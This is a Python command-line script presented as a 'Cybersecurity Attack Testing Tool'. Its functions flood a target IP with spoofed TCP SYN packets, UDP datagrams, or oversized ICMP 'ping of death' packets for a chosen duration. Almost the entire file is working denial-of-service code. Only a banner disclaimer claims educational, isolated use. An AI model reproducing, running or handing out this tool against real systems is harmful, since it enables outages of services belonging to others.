import argparse
import random
import socket
import threading
import time
from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import send

def syn_flood(target_ip, target_port, duration):
    """TCP SYN Flood Attack"""
    print("[+] Starting SYN Flood Attack...")
    timeout = time.time() + duration
    while time.time() < timeout:
        ip = IP(src=".".join(map(str, (random.randint(1, 255) for _ in range(4)))), dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)
    print("[+] SYN Flood Attack Completed.")

def udp_flood(target_ip, target_port, duration):
    """UDP Packet Flood Attack"""
    print("[+] Starting UDP Flood Attack...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        sock.sendto(packet, (target_ip, target_port))
    print("[+] UDP Flood Attack Completed.")

def ping_of_death(target_ip, duration):
    """Ping of Death Attack"""
    print("[+] Starting Ping of Death Attack...")
    timeout = time.time() + duration
    while time.time() < timeout:
        packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
        send(packet, verbose=False)
    print("[+] Ping of Death Attack Completed.")

def main():
    parser = argparse.ArgumentParser(description="Cybersecurity Attack Testing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (for TCP/UDP attacks)")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Duration of the attack in seconds")
    parser.add_argument("-a", "--attack", choices=["syn", "udp", "pod"], required=True, help="Attack type: syn (SYN Flood), udp (UDP Flood), pod (Ping of Death)")
    args = parser.parse_args()
    
    if args.attack == "syn":
        syn_flood(args.target, args.port, args.duration)
    elif args.attack == "udp":
        udp_flood(args.target, args.port, args.duration)
    elif args.attack == "pod":
        ping_of_death(args.target, args.duration)
    else:
        print("[!] Invalid attack type.")

if __name__ == "__main__":
    print("""
    #############################################################
    #                    CYBERSECURITY TOOL                      #
    #             Created by Sujal Lamichhane                   #
    #############################################################
    # Disclaimer: This tool is for educational and testing use   #
    # only in an isolated environment. Unauthorized use is       #
    # strictly prohibited and may violate laws.                  #
    #############################################################
    """)
    main()
